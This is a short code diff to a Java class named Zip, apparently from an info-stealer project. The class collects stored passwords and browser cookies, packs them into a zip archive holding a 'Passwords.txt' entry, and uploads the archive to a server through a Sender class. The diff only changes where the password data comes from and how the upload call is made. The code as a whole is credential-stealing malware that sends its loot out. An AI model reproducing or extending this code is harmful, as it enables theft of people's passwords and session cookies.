@@ -1,6 +1,7 @@
 package io.github.luxotick.impl;
 
 import io.github.luxotick.Sender;
+import io.github.luxotick.Start;
 import io.github.luxotick.impl.cookies.sendCookies;
 import io.github.luxotick.impl.Passwords;
 import okhttp3.MediaType;
@@ -21,13 +22,11 @@ public class Zip {
         ZipOutputStream zipOut = new ZipOutputStream(baos);
 
         // Get passwords and cookies
-        String passwords = new Passwords().grabPassword();
         Map<String, byte[]> cookies = new sendCookies().zaa();
 
         // Add passwords to zip
         zipOut.putNextEntry(new ZipEntry("Passwords.txt"));
-        String s = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
-        zipOut.write(s.getBytes());
+        zipOut.write(Start.aaaa.getBytes(StandardCharsets.UTF_8));
         zipOut.closeEntry();
 
         // Add cookies to zip
@@ -47,6 +46,6 @@ public class Zip {
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("file", "data.zip", requestBody)
                 .build());
-        Sender.sendToServer(zipData);
+        Sender.sendToServer(zipData, "data.zip");
     }
 }
